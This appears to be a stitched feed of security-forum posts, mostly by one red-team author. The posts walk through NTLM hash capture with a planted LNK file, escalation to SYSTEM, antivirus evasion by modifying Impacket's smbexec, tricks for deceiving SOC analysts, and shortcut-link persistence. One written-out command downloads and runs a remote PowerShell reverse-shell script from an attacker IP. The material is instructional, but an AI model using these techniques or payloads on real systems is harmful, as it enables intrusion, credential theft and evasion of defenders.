          <title>The Importance of Enumeration</title>

          <description><![CDATA[
            <p>We all love Exploitation and gaining access to a machine elevate our privileges and gain that SYSTEM, Administrator, Domain Admin Shell. It’s a rush that us as hackers love to see when we try to gain access to a box “Meterpreter Session 1 Opened”, Beacon, Grunt, etc. Oof hasn’t that been one of the most awesome sentences that you can see on your terminal when something you’ve been working on just works.</p>
<p>But how do we get here?. We don’t magically know the payload that needs to be used, or the exploit to use against our victim machine.</p>
<p><strong>Enumeration</strong> , that one very important step taken before we continue with our hacks around the network. Can we access the machine?. Enumeration. Can we exploit it?. Enumeration. What about Privesc, Enumeration. Anything on Persistence? Yep let’s enumerate to see what’s allowed as a user OR where to leave our backdoor that can blend with the environment, need to move around the Environment?, lets enumerate and see what is available.</p>
<p>Here I will demonstrate how enumeration can be achieved in many ways and also the variety of tools used for the same category so that you don’t have to be limited to this very well-known tools. For example nmap, everyone uses nmap the famous port scanning tool with incredible functionality that works well everywhere, but let’s not forget we have other tools, <strong>unicornscan, masscan, amap, rustscan.</strong> Let me work on an environment and show a variety of ways to enumerate and reach our goal and not be dependent on well-known tools.</p>
<p><strong>Initial Access</strong></p>
<p>My target machine is 10.0.2.24 I will start enumerating and search for access here see a way to gain an initial foothold.</p>
<p>As my scan from different tools finished these were my results.</p>
<p><strong>Nmap:</strong></p>

<p><strong>Rustscan:</strong></p>

<p><strong>And amap:</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/8/08ce0f7d4ee58bdb67692494022a8048acf13c70.png" alt="" data-base62-sha1="1fTiKh8kaJDX4zLMieTB5uGFpba" width="624" height="158"></p>
<p>With different tools for enumeration this may help in confirmation on what is going on, tools might use different methods to acquire information about a specific target. In this matter I can confirm that these ports are open as different tools have confirmed this now I can move forward and attack these ports or gain more information on them to lower my chances of failure when try to exploit these targets.</p>
<p>So let’s approach 135/139:</p>
<p>Rpcclient we will approach this port and enumerate with and without credentials (realistically this wouldn’t be available since it would most likely be a Blackbox test).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/8/08ce0f7d4ee58bdb67692494022a8048acf13c70.png" alt="" data-base62-sha1="1fTiKh8kaJDX4zLMieTB5uGFpba" width="624" height="158"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/8/381fafd367808a5108dce9c8a823e7a42457f129.png" alt="" data-base62-sha1="80uCSlSeQzyzVDjT0KpFp3tz0RX" width="624" height="170"></p>
<p>As seen above I am trying to enumerate users but this is most likely not going to happen with an anonymous user we will try with someone with credentials.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/e/2e67fd5ff31953365b5885b4e36673ed93995a5a.png" alt="" data-base62-sha1="6CwL9UoWSivv3Mj8GtCyEl5AzKq" width="485" height="99"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4647b67fbcd8378cc0125bf170a940bb79878f6.png" alt="" data-base62-sha1="nshAoi4Fy46PPlAmbiwUmxqQphk" width="422" height="82"></p>
<p>No luck with rpcclient as the user is not part of a Domain and only from the local machine, we can continue grabbing more info that is needed from the local machine but we will stop here.</p>
<p>Now let’s approach the 445 port (SMB):</p>
<p>I have used 3 different tools with the approach on anonymous enumeration but I had no luck finding shares <strong>smbclient, smpmap, smbclient.py from impacket</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/4/a4647b67fbcd8378cc0125bf170a940bb79878f6.png" alt="" data-base62-sha1="nshAoi4Fy46PPlAmbiwUmxqQphk" width="422" height="82"></p>
<p>I can also use the <strong>crackmapexec</strong> tool and I can see that the anonymous user has access to a share named Scans</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/3/433c123e279402b6215fe43af0aa995054d26705.png" alt="" data-base62-sha1="9AMGWmGJ137ssxwwYRrekl6B4P3" width="624" height="144"></p>
<p>From here you can choose your favorite tool to access the share and start exploring what is going on in that share.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/f/8f2affb38420370a347d76c1553e73312035b291.png" alt="" data-base62-sha1="kqwoYybbJh57PuvX5nnjiC5A40h" width="624" height="445"></p>
<p>Seems that we have a File that advises people to upload there work so it can be reviewed at the end of the day, the fact that we know this means that there is a user accessing this share at A certain time we can use this to taint the share and have it send us an NTLMv2 hash and try to crack it, so let us try and grab the hash of this user with the help of Responder.</p>
<p>I will build a LNK file with the ICON of the LNK pointing to my Machine so when Windows tries to load it, it will reach responder now I wait until the user browses the Share once that happens I will have responder listening on my attacking machine and capture the NTLM hash</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/c/5cb20cc7a373e8d54a69498deda6d128ae443ce4.png" alt="" data-base62-sha1="de1oDUcbYM1nedAPUijjtCPxjH6" width="624" height="304"></p>
<p>Then I use PUT from smbclient and move the file on the share with my anonymous access to the share utilizing SMBCLIENT</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6aa5c3dd229bf254264109d27a8e25dbed2a2457.png" alt="" data-base62-sha1="fdrLeTYyYovS2vwNAEr8A5Bm31d" width="624" height="166"></p>
<p>I add the file (LNK) and once the share is browsed Windows will search for the ICO that is pointing to my attacking machine</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/8/48f7d334cbbd6a97e87c4756d055f448a48660eb.png" alt="" data-base62-sha1="apvl71Nj4DoLak9NFIJ5Y5e7xIT" width="624" height="193"></p>
<p>And hashes are captured</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/5/f59f0288a6205f61c2c8c386e61aa171406f90c0.png" alt="" data-base62-sha1="z2REL1v2tVKu5dhfzqo2BrjzAGc" width="624" height="343"></p>
<p>Now we will use these hashes to crack the password, my favorite is using hashcat and a few rules “One_rule_to_rule_them_all” (Do let me know if I messed up the name). And here I like using Windows for hashcat</p>
<p>And we managed to crack the Hash</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/a/3ab7f1b35aaa54a618a12ea779d82188735bccac.png" alt="" data-base62-sha1="8nrN5ESaHJ2zU3IZeItK4MKADOQ" width="624" height="98"></p>
<p>Once we have the credentials let us try them and see what Adrian’s permissions are on the machine. Will utilize crackmapexec.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/9/1942842fb6c1710895994578a4ac6d1426616df7.png" alt="" data-base62-sha1="3BsrJLEPASRr9veoMok6UYHyjDp" width="624" height="141"></p>
<p>Fantastic we have credentials, but now from our limited options let us try and get a Shell on the machine from checking out nmap again we see that there is PSRemote available</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/c/dc4fc1c7cce1e82f441b1b1a634c626f769138a5.png" alt="" data-base62-sha1="vqXVa7frSjbUNte02c7STK5qPCB" width="624" height="343"></p>
<p>Let’s use this and get a connection.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/89202fbf2eb2a4672dd2b5140f0f491563c56d6a.png" alt="" data-base62-sha1="jz4n6MLidNwNOREqmblYJRbrzmi" width="624" height="204"></p>
<p>Now I will upgrade my Shell to a Grunt from Covenant C2 (Just my taste). Now that we have our Grunt With Medium Integrity and running on PowerShell with the user anovoa time to Privesc to a higher user.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/7/a7a77b0ce139f704be57beea44f97bcaf5248a10.png" alt="" data-base62-sha1="nV8yV4MwoAHJBrOL7NKEDx8s17q" width="624" height="141"></p>
<p>I will use the SharpUp Task to gain information on how to Privesc but I will also use another favorite as I really love the output and the details check it has PrivescCheck.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2aed941d304ada848123f4dbd4edbd1a6923f3ff.png" alt="" data-base62-sha1="67L3W5rnAl3trpWrcOXva2dZuEL" width="407" height="121"></p>
<p>AlwaysInstall Elevated Key OK good sign we can use this, I always have the option to validate with PrivescCheck or by querying the Registry Keys manually</p>
<p>PrivescCheck</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/1/419486dea53167c0a2636b0b6867047d9b83e3d2.png" alt="" data-base62-sha1="9m9fFYsv9s2MuaQN3mApwqvn4SS" width="624" height="345"></p>
<p>Now let us upload our MSI Installer built from VS with a GruntSMB and grab a higher privileged Grunt.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/0/100158ed2a4343cb68689e1bcbd359a5e0a7b0a9.png" alt="" data-base62-sha1="2hAwCUv0vXQZGYs7RBIkMcOakkN" width="503" height="101"></p>
<p>I will execute using msiexec and connect back to the Grunt with higher privileges</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96a16a013c69f506a733b54fa39e294c5a8de4ee.png" alt="" data-base62-sha1="luxrOzSVVEb5JWtXtnY2z6otJ2C" width="537" height="199"></p>
<p>No worries if it hangs on Tasked its normal behavior, we can see our new grunt as SYSTEM</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/f/ef142a86d6a794349ad9cf784e6506252d9d25a8.png" alt="" data-base62-sha1="y6ZjUv3NQlqMRsBgSAmUT4DHMeI" width="624" height="54"></p>
<p>And from here we can continue our enumeration and move forward with Compromising the Domain or leaving a persistent access or much more, the reason for this was to demonstrate the importance of enumeration as (Myself as well) I read that various people are just trying to throw exploits to machines and saying, “It doesn’t work”. Trying to search for ports, users, services, privilege escalation methods and others. I hope this has been helpful and maybe learned something from it.</p>
<p>Dumping Hashes from SAM (Got an error because Covenant is using and older version of Mimikatz, well the version I am using)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/f/4f4651cdf3325f7ac84f7f62ae3d193c59999c42.png" alt="" data-base62-sha1="bjinvh5e4oeQ9LCpnEKhgw5CgCK" width="401" height="383"></p>

          <title>A Dive on SMBEXEC</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>One of the things that makes a good red teamer is to understand our tools. I noticed recently how these tools are being looked at and I demonstrate a little on what we can do about these well known attacks.</p>
<p>We all know the glorious Impacket tools, very well known in the Cybersecurity Community and hackers among us. Today I will take a look at the Impacket tools. I was recently surprised by how these tools get detected and why are they found while Threat Hunting, I also wanted to understand on why it was happening. And while searching I was mind blown, probably old to some people but damn I wanted to write about it.</p>
<p>I will work with SMBEXEC on this talk.</p>
<p>Now let’s check a little the SMBEXEC code. One of the first things that stand out to me is some BAT files and output files that seems to be written onto the target machine when executed.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07aa09b14e99f296e3d0f66760ea56650a4980e.png" data-download-href="/uploads/short-url/tKi2AzWHQmUMzDJN5VSK4X43sMS.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07aa09b14e99f296e3d0f66760ea56650a4980e.png" alt="" data-base62-sha1="tKi2AzWHQmUMzDJN5VSK4X43sMS" role="presentation" width="513" height="140"></a></div><p></p>
<p>Let’s run the tool and see what happens out of the box to take a better look at what is going on with this tool.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0418a3504b108b30dcd746ac7ad9dc88eeb5487e.png" data-download-href="/uploads/short-url/AeHb5x8obazMGlLoPwh81HD62i.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/0418a3504b108b30dcd746ac7ad9dc88eeb5487e.png" alt="" data-base62-sha1="AeHb5x8obazMGlLoPwh81HD62i" width="690" height="237" role="presentation"></a></div><p></p>
<p>As expected</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a1d12f588a0ccd971584ec5b7ba94ef568c9fd1.png" data-download-href="/uploads/short-url/60ylmO62kRReH8TWr80TjjeXN4J.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/a/2a1d12f588a0ccd971584ec5b7ba94ef568c9fd1.png" alt="" data-base62-sha1="60ylmO62kRReH8TWr80TjjeXN4J" role="presentation" width="403" height="196"></a></div><p></p>
<p>But, why?. Let’s take a look at what happened.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1ec11d536ec0418a513ded9526f6466d8c85b487.png" data-download-href="/uploads/short-url/4o44lBPTUiYdJpP1dQTmHczoKtp.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/e/1ec11d536ec0418a513ded9526f6466d8c85b487.png" alt="" data-base62-sha1="4o44lBPTUiYdJpP1dQTmHczoKtp" role="presentation" width="478" height="399"></a></div><p></p>
<p>Oh, so I’s a command line that is getting detected, it does seem to be strange that an Administrator Account tries to Write a bat file onto the Temp Folder, Execute it and then remove it. Right?.</p>
<p>Now let’s take a look at the part of Impacket that gets detected and find this piece of code. We are well aware that we have a section of the code where it’s creating the execute.bat file</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/9/4981359892af0d597d8cd9ac1847ce69b059bfc8.png" data-download-href="/uploads/short-url/aufGtATWv49KvRGmjDL7jrngSla.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/9/4981359892af0d597d8cd9ac1847ce69b059bfc8.png" alt="" data-base62-sha1="aufGtATWv49KvRGmjDL7jrngSla" role="presentation" width="434" height="139"></a></div><p></p>
<p>Now I changed the code and found some “synonyms” of each of the words that were hardcoded onto the tool, I had no idea what BTO meant so I chose a more “legitimate” service name.</p>
<p>Now let’s try running the tool again. <strong>[Remember we still haven’t changed the command, wanted to test if this was enough to bypass]</strong> .</p>
<p>Damn it, no luck at all.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07c28b96575b7dc0b2f4a087b07d3374399f62d.png" data-download-href="/uploads/short-url/tKlk3lWLKMrybhAujNUIw2eXAV7.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d07c28b96575b7dc0b2f4a087b07d3374399f62d.png" alt="" data-base62-sha1="tKlk3lWLKMrybhAujNUIw2eXAV7" role="presentation" width="551" height="407"></a></div><p></p>
<p>Ok, now let’s dig a little deeper on the command line this time.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/7/679acc1fad1b2ad852614430f5e07504ff28c56f.png" data-download-href="/uploads/short-url/eMwPxobxiQr0xOyLPQ1EuJ2gTRZ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/7/679acc1fad1b2ad852614430f5e07504ff28c56f.png" alt="" data-base62-sha1="eMwPxobxiQr0xOyLPQ1EuJ2gTRZ" width="690" height="195" role="presentation"></a></div><p></p>
<p>Ok, let’s see the <strong>self._output</strong> section, looks for the local drive C$ (Accessible to Administrator) smbexec will choose this by default if no other is selected, will continue to output the BAT file, execute it and then proceed to delete it. But look here, it seems to be calling <strong>cmd.exe</strong> using an environment variable for all this to run. Let us take a quick look at our variables for Windows.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" data-download-href="/uploads/short-url/sdDKCJjM4TDfiI4yZFKDZlrnvtN.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c5c79f7dc673bbf1c5bbfe4d3d8b1b710edc23cb.png" alt="" data-base62-sha1="sdDKCJjM4TDfiI4yZFKDZlrnvtN" role="presentation" width="507" height="500"></a></div><p></p>
<p>Aaaah so there we go, cmd.exe now, in what other ways can we call cmd.exe?, Directly with other variables?. Let’s go down a little further.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/8/1893f13da6efe21141263f8aa3d8c5258a4b3082.png" data-download-href="/uploads/short-url/3vqqj2kfcG2H1DNki1HQlK9UPmi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/8/1893f13da6efe21141263f8aa3d8c5258a4b3082.png" alt="" data-base62-sha1="3vqqj2kfcG2H1DNki1HQlK9UPmi" role="presentation" width="349" height="186"></a></div><p></p>
<p>Here are some interesting ones, <strong>%SystemDrive%, %SystemRoot%, %windir%.</strong> Great we have 3 options to have our way and execute cmd.exe, let’s try these for our tool smbexec.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/e/6ed94cb310a3017a481a96f2398bf6e3270ade26.png" alt="" data-base62-sha1="fOC5cW9y3uFnFRjSuirtYskcsAu" role="presentation" width="624" height="55"></p>
<p>Ok, so I edited it for it to call cmd.exe in a different manner I will use 1 variable and add the other part of the path to reach <strong>cmd.exe</strong></p>
<p>Let’s see what happens:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2bf6528e6699f480816b9ad5d40df682448eba.png" data-download-href="/uploads/short-url/f9eNCTr6RfrmnQeIC7VnTqH4uMi.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2bf6528e6699f480816b9ad5d40df682448eba.png" alt="" data-base62-sha1="f9eNCTr6RfrmnQeIC7VnTqH4uMi" role="presentation" width="547" height="406"></a></div><p></p>
<p>Damn it’s still getting caught, let’s dive a little more, so what other thing can get detected besides our different variables that are used, oh your thinking the same right?. Exactly the parameters, very smart. But which one is it? /Q or /c maybe both???. Let’s not take a risk and do something about that.</p>
<p>Now let’s understand what happens when we use these parameters we want to focus on <strong>/Q, /c.</strong> So if we check the help menu from CMD</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/e/fe333de237d39321b27950881601ecb429e2bdef.png" data-download-href="/uploads/short-url/AgL3RRRzAnjQTJe66CsQdrQuthJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/e/fe333de237d39321b27950881601ecb429e2bdef.png" alt="" data-base62-sha1="AgL3RRRzAnjQTJe66CsQdrQuthJ" width="690" height="247" role="presentation"></a></div><p></p>
<p>Ok so <strong>/C</strong> carries out the command by string and then it terminates it [this is important], if we run smbexec with this here is the result on Process Explorer:</p>
<p>But if we run it with <strong>/k</strong> carries out the command but remains.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a871ca376fa45b93fdc68d26592440d0e0171be0.png" data-download-href="/uploads/short-url/o280xMQZAQkXVIoa0vtCKiEzaW4.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a871ca376fa45b93fdc68d26592440d0e0171be0.png" alt="" data-base62-sha1="o280xMQZAQkXVIoa0vtCKiEzaW4" role="presentation" width="412" height="454"></a></div><p></p>
<p>We have a process, and its running as SYSTEM, damn. No output of course, we gain a shell but we leave a process behind.</p>
<p>But, what other alternatives do we have??. Change the Environment variable and add a slight tweak to the /c parameter, I don’t know why but this works just by adding a (,). I tried to understand it but it seems way over my knowledge cmd is very amazing so much we do not know.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae48d0919ed53616158f415707ce01bbdf03c35a.png" alt="" data-base62-sha1="oRN5fvJKCR6MPwXJr5Z4FY79iFY" role="presentation" width="607" height="63"></p>
<p><em><strong>[After a while I noticed that the parameter /c was the one being flagged]</strong></em></p>
<p>Now let’s try it.</p>
<p><a href="https://vimeo.com/514543644">A Dive to SMBEXEC - Mute</a></p>

<p>Ok nice video if I say so, but now I am thinking, wait you have Code Execution why are you doing all this crazy stuff?. Why not just execute a PowerShell Command and call your obfuscated, super hidden payload instead of leaving traces behind. Well of course you can do that as well!!.</p>
<p>We have out AV up and running:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/1/11486f24edbe15c9d5c512e77a0c7f5f4929fdf2.png" data-download-href="/uploads/short-url/2sTj02TTY0QaW5jU5Lh0AmwtbLc.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/1/11486f24edbe15c9d5c512e77a0c7f5f4929fdf2.png" alt="" data-base62-sha1="2sTj02TTY0QaW5jU5Lh0AmwtbLc" role="presentation" width="555" height="321"></a></div><p></p>
<p>Now let’s move back to our attacking machine and execute our smbexec with our PowerShell command</p>
<p>I setup a listener, my command running smbexec and a python server to call my shell and receive the connection back to my machine.</p>
<p>Listener:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d71458dcc39bc3246b3e8faa288ab3cca2785bc5.png" data-download-href="/uploads/short-url/uGGftDT8FOOOZ1rST8ghX7w8mGx.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/7/d71458dcc39bc3246b3e8faa288ab3cca2785bc5.png" alt="" data-base62-sha1="uGGftDT8FOOOZ1rST8ghX7w8mGx" role="presentation" width="564" height="182"></a></div><p></p>
<p>Python Server:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/a/ba8ff60842fb08cc903710dec3eb614ec96411d8.png" data-download-href="/uploads/short-url/qCpfatgdoV7JYiyGI6lkpb2pyBy.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/a/ba8ff60842fb08cc903710dec3eb614ec96411d8.png" alt="" data-base62-sha1="qCpfatgdoV7JYiyGI6lkpb2pyBy" role="presentation" width="562" height="171"></a></div><p></p>
<p>SMBEXEC:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/5/35d03f7a712338eacfa52b743058cc2786888385.png" alt="" data-base62-sha1="7G3tspVG5PZugqHuoAEryqZZw9L" width="690" height="19" role="presentation"></p>
<pre><code class="lang-auto">cmd.exe /Q /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:8000/Connectar-Tcp.ps1');
</code></pre>
<p>Shell:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/a/5a24d849b1f7faf90c6d905fa24c632614dbc718.png" data-download-href="/uploads/short-url/cRrUybJ35jbOPux5Mpq2T02rBXO.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/a/5a24d849b1f7faf90c6d905fa24c632614dbc718.png" alt="" data-base62-sha1="cRrUybJ35jbOPux5Mpq2T02rBXO" width="643" height="342" role="presentation"></a></div><p></p>
<p>Afterwards:</p>
<p>Breaks SMBEXEC</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7cec55be4fdabf2ca30f37c6b27464548ce52432.png" data-download-href="/uploads/short-url/hP7yclv85NrffhqvJhPTAgo1xvQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7cec55be4fdabf2ca30f37c6b27464548ce52432.png" alt="" data-base62-sha1="hP7yclv85NrffhqvJhPTAgo1xvQ" width="624" height="187" role="presentation"></a></div><p></p>
<p>After this simple demonstration I wanted to show how some changes to our tools functionality can have us again connected to the user’s network. We have plenty of possibilities to achieve our goal. We just have to think a little bit out of the Box</p>
<p>You can take a look that the AV was only flagging the <strong>/c</strong> parameter and probably anything after that, but once a small difference is added we can see that our code gets executed as there are plenty of methods to achieve this, Hmm maybe replacing it with a LOLBIN???. Who knows but it might be out there.</p>
<p>Keep Learning!!</p>

            <p>Hi everyone!!.<br>
It been a while, yeah, you know life, bills, pandemic and all the stuff that 2020 left for us. Now about a while back I posted a Gitbook for helping anyone to jump onto the amazing area of Red Team, but man is it difficult to jump to, there are some great resources out there (MITRE, Twitter, Blogs) maybe it was just me but did I had some difficulties trying to find the correct things and get myself in the right direction without losing track of my RED TEAM and well here I am putting my notes updated to the internet to find. It is very beginner friendly and have everything from MITRE with more great images and high level explanations also Videos!!.<br>
I really hope this helps for anyone getting started on this awesome field and trying to Red Team Harder.</p>

<p>Oh if any mistakes or I forgot to mention some of the great resources I TRIED FINDING, please do let me know. I left the old gitbook also up just reference, hey we all start somewhere. <img src="https://0x00sec.org/images/emoji/twitter/yum.png?v=9" title=":yum:" class="emoji" alt=":yum:"></p>

          <description><![CDATA[
            <p>Hello 0x00sec, long time no see!</p>
<p>Today I decided to start a discussion around innovative Red Team TTP’s we have encountered or used.</p>
<p>For those who are not familiar with the concept; RT and Pentest methodologies have different goals in mind. Despite using similar methods, they answer different questions.</p>
<blockquote>
<p><strong>PT Questions:</strong> Can my infrastructure be hacked? If so, <em>how?</em><br>
<strong>PT Goals:</strong> Discovery of various <em>attack paths</em> into a system. (The concept of “attack path” is the nuance between a PT and a Vulnerability Assessment. VA focus on singular vulnerabilities, whereas PT focus on exploiting vulnerabilities towards a specific <em>impact.</em> This act of exploitation is called an “attack path”.)</p>
</blockquote>
<blockquote>
<p><strong>RT Questions:</strong> Am I prepared against real world attacks? <em>Can I detect</em> when I’m being attacked? <em>Can I stop it</em> before it causes any damage?<br>
<strong>RT Goals:</strong> Emulating or simulating various type of <em>threats</em> and measuring the efficiency of incident detection and response process.</p>
</blockquote>
<p>I think the subject of this discussion is more clear now. When talking about Red Team TTP’s <strong>we’re NOT</strong> talking about: pentesting tools, attack techniques, exploits, RATs or crypters (unless the technique is novel).</p>
<h2><a name="p-60391-ttp-1-using-unquoted-service-paths-to-mislead-analysts-1" class="anchor" href="https://d.clarkee.co.uk#p-60391-ttp-1-using-unquoted-service-paths-to-mislead-analysts-1"></a>TTP 1: Using “Unquoted Service Paths” to mislead analysts</h2>
<p>If you’re going to deploy your backdoor as a new service, leverage “unquoted service path” to confuse detection systems and the SOC.</p>
<blockquote>
<p>Service path: C:\Program Files\decoymalware.exe<br>
Real malware: C:\Program.exe</p>
</blockquote>
<p>You could use <em>decoymalware.exe</em> as a means to deceive security operators. Maybe put a legitimate and signed binary there so when your new service is discovered and binary is uploaded to VT it would seem completely innocent and the alert might get disregarded as a false positive.</p>
<p>Or if its likely that this will be further investigated you could put a completely irrelevant malware to mislead. A known cryptominer maybe? It is malicious but not really that important so the alert regarding to your backdoor will be quickly “resolved”.</p>
<h2><a name="p-60391-ttp-2-using-remote-drive-mapping-to-steal-ntlm-hashes-2" class="anchor" href="https://d.clarkee.co.uk#p-60391-ttp-2-using-remote-drive-mapping-to-steal-ntlm-hashes-2"></a>TTP 2: Using Remote Drive Mapping to steal NTLM hashes</h2>
<p>In several investigations I came across LNK files pointing to remote smb paths. Their purpose was to force the client to authenticate with the attacker’s smb server. Thus, the attacker could steal the victim’s NTLM hash. I found this usage of RDM’s innovative.</p>
<h2><a name="p-60391-ttp-3-dns-poisoning-and-injecting-into-google-analytics-js-3" class="anchor" href="https://d.clarkee.co.uk#p-60391-ttp-3-dns-poisoning-and-injecting-into-google-analytics-js-3"></a>TTP 3: DNS Poisoning and Injecting into Google Analytics JS</h2>
<p>Now think about the browsing activity of a normal user. Probably more than half of the webpages he’ll visit will be requesting JS files from Google Analytics. So if you can somehow redirect these requests to your own webserver (by DNS poisoning, or MITM, or sth else) and replace these JS files, you will have the perfect C2 system for your malware! Your malware won’t have to send even a single TCP packet. The browsing activity of your victim will be the carrier of your messages and it will be frequent enough! <img src="https://d.clarkee.co.uk/images/emoji/twitter/smile.png?v=15" title=":smile:" class="emoji" alt=":smile:" loading="lazy" width="20" height="20"></p>

<p>Today I will talk about persistence, the technique used by adversaries to maintain their foothold on your network. It mainly consists of techniques used by adversaries to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.</p>
<p>Many tools are great for these techniques and I will demonstrate a few simple one’s to get started you can always research for more advance methods and techniques, and probably other tools than can aid in being stealthy across the Network. Try to learn as many methods as possible with a C2 and without it. Most commonly since you are a Red Teamer you will be using some sort of C2 for your Shells.</p>
<p>I am not trying to be stealthy here I will just demonstrate the ways we can keep our Access onto the System.</p>
<p>I will work with some very easy ones, some of these samples you can find on my <a href="https://dmcxblue.gitbook.io/red-team-notes/" rel="noopener nofollow ugc">GitBook</a>, MITRE and other great sources .</p>
<p>I will work with a regular shell but try to learn this as well to keep your persistence using a C2. I will start with a Simple One.</p>
<p><strong>Shortcut Links</strong></p>
<p>The easiest to work with and sometimes very effective, workers rely on Shortcut Links or sometimes have no idea that they create this, to access their files “Faster” (for what I  heard) so why not trick them to running our Shell and Execute code.</p>
<p>It’s easy to follow in this Method.</p>
<p>Right-Click &gt;&gt; New &gt;&gt; Shortcut</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d16989f37b531665c927ee42909e5c131b82557.png" alt="" data-base62-sha1="dhuODWyAOg4LI3J6yb6b0EnIXob" width="566" height="304"></p>
<p>Then Right Click &gt;&gt; Properties &gt;&gt; Add your Code Here</p>
<p>Optional: You can change the “Start in:” and your Shell will start in that Directory. To change the Icon just Change Icon &gt;&gt; Find the Path for the ICO file and Select then you are good to go.</p>

<p>Once it’s clicked you will gain a Shell and their Link just won’t do anything “Almost” in the background it will execute a PowerShell command to call your Shell in Memory.</p>

<p>Perfect the Command executed and gain us our Connection. No Flags, No AV. Very easy to use and have a quick Persistence technique running on the Target System. A quick and Simple Technique yet effective when applied correctly on environments that can be easily tricked.</p>
